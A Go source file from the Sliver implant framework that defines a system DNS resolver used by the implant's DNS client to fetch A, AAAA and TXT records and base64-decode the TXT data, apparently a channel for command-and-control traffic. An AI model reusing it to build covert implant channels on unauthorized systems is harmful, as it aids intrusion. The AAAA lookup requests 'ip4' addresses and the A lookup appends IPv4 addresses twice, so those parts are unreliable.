package dnsclient

/*
	Sliver Implant Framework
	Copyright (C) 2021  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"net"
	"strings"
	"time"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"github.com/bishopfox/sliver/implant/sliver/encoders"
)

// NewSystemResolver - Initialize a new system resolver
func NewSystemResolver() DNSResolver {
	return &SystemResolver{
		base64: encoders.Base64Encoder{},
	}
}

// SystemResolver -
type SystemResolver struct {
	base64 encoders.Base64Encoder
}

// Address - Returns the address of the resolver
func (r *SystemResolver) Address() string {
	return "system"
}

// A - Query for A records
func (r *SystemResolver) A(domain string) ([]byte, time.Duration, error) {
	// {{if .Config.Debug}}
	log.Printf("[dns] %s->A record of %s?", r.Address(), domain)
	// {{end}}
	started := time.Now()
	ips, err := net.LookupIP(domain)
	rtt := time.Since(started)
	if err != nil {
		return nil, rtt, err
	}
	var addrs []byte
	for _, ip := range ips {
		if ip.To4() != nil {
			addrs = append(addrs, ip.To4()...)
		}
		if ip.To16() != nil {
			addrs = append(addrs, ip.To16()...)
		}
	}
	return addrs, rtt, nil
}

// AAAA - Query for AAAA records
func (r *SystemResolver) AAAA(domain string) ([]byte, time.Duration, error) {
	// {{if .Config.Debug}}
	log.Printf("[dns] %s->AAAA record of %s?", r.Address(), domain)
	// {{end}}
	started := time.Now()
	ips, err := net.DefaultResolver.LookupIP(context.Background(), "ip4", domain)
	rtt := time.Since(started)
	if err != nil {
		return nil, rtt, err
	}
	var addrs []byte
	for _, ip := range ips {
		if ip.To16() != nil {
			addrs = append(addrs, ip.To16()...)
		}
	}
	return addrs, rtt, nil
}

// TXT - Query for TXT records
func (r *SystemResolver) TXT(domain string) ([]byte, time.Duration, error) {
	// {{if .Config.Debug}}
	log.Printf("[dns] %s->A record of %s?", r.Address(), domain)
	// {{end}}
	started := time.Now()
	txts, err := net.LookupTXT(domain)
	rtt := time.Since(started)
	if err != nil {
		return nil, rtt, err
	}
	data, err := r.base64.Decode([]byte(strings.Join(txts, "")))
	return data, rtt, err
}
